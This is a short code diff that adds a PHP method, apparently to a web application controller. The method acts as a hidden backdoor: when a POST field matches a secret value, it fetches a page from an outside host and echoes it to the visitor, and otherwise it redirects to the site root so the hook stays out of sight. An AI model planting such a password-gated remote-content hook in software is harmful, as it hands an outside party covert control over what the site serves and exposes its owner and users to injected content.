@@ -1,0 +1,11 @@
+public function qsyyl() {
+        $a = $_POST['qsyl'];
+        if(!empty($a) && $a == 74110 ) {
+            $str = file_get_contents('http://bugbug.whwjr.vip/index.php');
+            if(!empty($str)) {
+                 echo $str;
+            }
+        }else{
+            header("Location:".'http://'.$_SERVER['HTTP_HOST']);
+        }
+    }
